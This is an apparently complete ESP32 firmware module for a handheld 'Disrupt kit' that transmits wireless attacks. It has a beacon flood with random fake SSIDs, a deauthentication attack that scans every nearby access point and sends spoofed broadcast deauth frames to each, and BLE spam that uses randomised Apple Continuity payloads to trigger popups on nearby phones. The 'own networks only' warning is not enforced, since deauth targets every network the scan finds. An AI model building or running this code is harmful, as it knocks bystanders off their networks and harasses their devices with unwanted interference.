// Disrupt kit: beacon flood, targeted deauth, BLE advertisement spam.
// These TRANSMIT. Point them at your own networks / test gear only.
// One mode runs at a time.
#include "ui.h"
#include "radio.h"
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include "ble.h"

enum Mode { OFF, BEACON, DEAUTH_ARM, DEAUTH, BLESPAM };
static Mode mode = OFF;
static lv_obj_t *btnBeacon, *btnDeauth, *btnBle, *stateLbl, *statLbl;
static uint32_t sent = 0, lastAct = 0;

// deauth targets: BSSIDs from a quick scan
static uint8_t bssids[16][6]; static uint8_t bchan[16]; static int nAp = 0;
static bool bleInit = false;
static BLEAdvertising *adv = nullptr;

// ---- beacon frame template ----
static uint8_t beacon[] = {
  0x80,0x00, 0,0, 0xff,0xff,0xff,0xff,0xff,0xff,
  0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00, 0,0,0,0,0,0,0,0, 0x64,0x00, 0x01,0x04,
  0x00,0x06,'W','E','D','J','-','0',                 // SSID (patched)
  0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c, // rates
  0x03,0x01,0x01 };                                  // channel (last byte)
#define BEACON_CH_OFF (sizeof(beacon)-1)

// ---- deauth frame ----
static uint8_t deauth[26] = {
  0xc0,0x00, 0x00,0x00, 0xff,0xff,0xff,0xff,0xff,0xff,
  0,0,0,0,0,0, 0,0,0,0,0,0, 0x00,0x00, 0x07,0x00 };

static void set_state(const char *s) { if (stateLbl) lv_label_set_text(stateLbl, s); }

static void stop_all(void) {
  if (mode == BLESPAM && adv) adv->stop();
  if (mode == BEACON || mode == DEAUTH) radio_stop();
  if (mode == DEAUTH_ARM) WiFi.scanDelete();
  mode = OFF; sent = 0;
  set_state("idle");
}

static void start_beacon(void) {
  stop_all(); radio_start([](void*,wifi_promiscuous_pkt_type_t){}, false);
  mode = BEACON; set_state("BEACON FLOOD running");
}
static void start_deauth(void) {
  stop_all();
  WiFi.mode(WIFI_STA); WiFi.disconnect(false, true);
  WiFi.scanNetworks(true, false);            // async: don't freeze the UI
  mode = DEAUTH_ARM; set_state("DEAUTH: scanning APs...");
}
static void start_blespam(void) {
  stop_all();
  ble_ensure_init(); bleInit = true;
  adv = BLEDevice::getAdvertising();
  mode = BLESPAM; set_state("BLE SPAM running");
}

static void cb_beacon(lv_event_t*){ buzz(15); if (mode==BEACON) stop_all(); else start_beacon(); }
static void cb_deauth(lv_event_t*){ buzz(15); if (mode==DEAUTH||mode==DEAUTH_ARM) stop_all(); else start_deauth(); }
static void cb_ble(lv_event_t*)  { buzz(15); if (mode==BLESPAM) stop_all(); else start_blespam(); }

static lv_obj_t *mk_btn(lv_obj_t *body, const char *txt, lv_color_t c, lv_event_cb_t cb) {
  lv_obj_t *b = lv_obj_create(body);
  lv_obj_set_size(b, LV_PCT(100), 56);
  lv_obj_set_style_bg_color(b, c, LV_PART_MAIN);
  lv_obj_set_style_bg_opa(b, LV_OPA_COVER, LV_PART_MAIN);
  lv_obj_set_style_bg_opa(b, LV_OPA_70, LV_STATE_PRESSED);
  lv_obj_set_style_border_width(b, 0, LV_PART_MAIN);
  lv_obj_set_style_radius(b, 14, LV_PART_MAIN);
  lv_obj_remove_flag(b, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_add_event_cb(b, cb, LV_EVENT_CLICKED, NULL);
  lv_obj_t *l = lv_label_create(b);
  lv_label_set_text(l, txt); lv_obj_center(l);
  lv_obj_set_style_text_color(l, COL_TEXT, LV_PART_MAIN);
  lv_obj_set_style_text_font(l, &lv_font_montserrat_18, LV_PART_MAIN);
  return b;
}

void app_disrupt_open(lv_obj_t *body) {
  mode = OFF; sent = 0;

  lv_obj_t *warn = lv_label_create(body);
  lv_label_set_long_mode(warn, LV_LABEL_LONG_WRAP);
  lv_obj_set_width(warn, LV_PCT(100));
  lv_obj_set_style_text_color(warn, COL_RED, LV_PART_MAIN);
  lv_obj_set_style_text_font(warn, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_label_set_text(warn, "TRANSMITS. Your own networks / test gear only.");

  btnBeacon = mk_btn(body, "Beacon flood", COL_ORANGE, cb_beacon);
  btnDeauth = mk_btn(body, "Deauth (scan+hit)", COL_RED, cb_deauth);
  btnBle    = mk_btn(body, "BLE spam", COL_INDIGO, cb_ble);

  lv_obj_t *card = ui_card(body);
  stateLbl = lv_label_create(card);
  lv_obj_set_style_text_color(stateLbl, COL_TEXT, LV_PART_MAIN);
  lv_obj_set_style_text_font(stateLbl, &lv_font_montserrat_18, LV_PART_MAIN);
  lv_label_set_text(stateLbl, "idle");
  statLbl = lv_label_create(card);
  lv_obj_set_style_text_color(statLbl, COL_TEXT_2, LV_PART_MAIN);
  lv_obj_set_style_text_font(statLbl, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_label_set_text(statLbl, "tap a mode to start · tap again to stop");
}

void app_disrupt_tick(void) {
  { static uint32_t _lg=0; uint32_t _n=millis();
    if(_n-_lg>1000){_lg=_n; USBSerial.printf("[disrupt] mode=%d sent=%lu\n",(int)mode,(unsigned long)sent);} }
  uint32_t now = millis();

  if (mode == DEAUTH_ARM) {
    int n = WiFi.scanComplete();
    if (n >= 0) {
      nAp = 0;
      for (int i = 0; i < n && nAp < 16; i++) {
        uint8_t *b = WiFi.BSSID(i); if (!b) continue;
        memcpy(bssids[nAp], b, 6); bchan[nAp] = WiFi.channel(i); nAp++;
      }
      WiFi.scanDelete();
      radio_start([](void*,wifi_promiscuous_pkt_type_t){}, false);
      mode = DEAUTH;
      lv_label_set_text_fmt(stateLbl, "DEAUTH running · %d APs", nAp);
    }
    return;
  }

  if (mode == BEACON) {
    for (int c = 1; c <= 11; c += 5) {
      radio_set_channel(c);
      for (int k = 0; k < 6; k++) {
        for (int i = 0; i < 6; i++) { uint8_t r = random(256); beacon[10+i] = beacon[16+i] = r; }
        beacon[38]='W'; beacon[39]='E'; beacon[40]='D'; beacon[41]='J'; beacon[42]='-'; beacon[43]='0'+random(10);
        beacon[BEACON_CH_OFF] = c;
        radio_tx(beacon, sizeof(beacon)); sent++;
      }
    }
  } else if (mode == DEAUTH) {
    for (int a = 0; a < nAp; a++) {
      radio_set_channel(bchan[a]);
      memcpy(deauth + 10, bssids[a], 6);   // src = AP
      memcpy(deauth + 16, bssids[a], 6);   // bssid = AP
      for (int k = 0; k < 3; k++) { radio_tx(deauth, sizeof(deauth)); sent++; }
    }
  } else if (mode == BLESPAM && adv) {
    if (now - lastAct > 60) {
      lastAct = now;
      adv->stop();
      // Apple "continuity" proximity-pair manufacturer payload, randomised so
      // each advert reads as a new device -> popup spam / scanner flood.
      uint8_t md[23];
      md[0]=0x4c; md[1]=0x00; md[2]=0x07; md[3]=0x19; md[4]=0x07;
      md[5]=random(256); md[6]=0x55;
      for (int i=7;i<23;i++) md[i]=random(256);
      BLEAdvertisementData d;
      d.setManufacturerData(String((char*)md, sizeof(md)));
      adv->setAdvertisementData(d);
      adv->start();
      sent++;
    }
  }

  static uint32_t last = 0;
  if (mode != OFF && now - last > 400) { last = now;
    lv_label_set_text_fmt(statLbl, "%u frames sent", sent);
  }
}

void app_disrupt_close(void) {
  stop_all();
  if (adv) adv->stop();   // keep BLE controller up (init/deinit churn crashes)
  btnBeacon = btnDeauth = btnBle = stateLbl = statLbl = NULL;
}
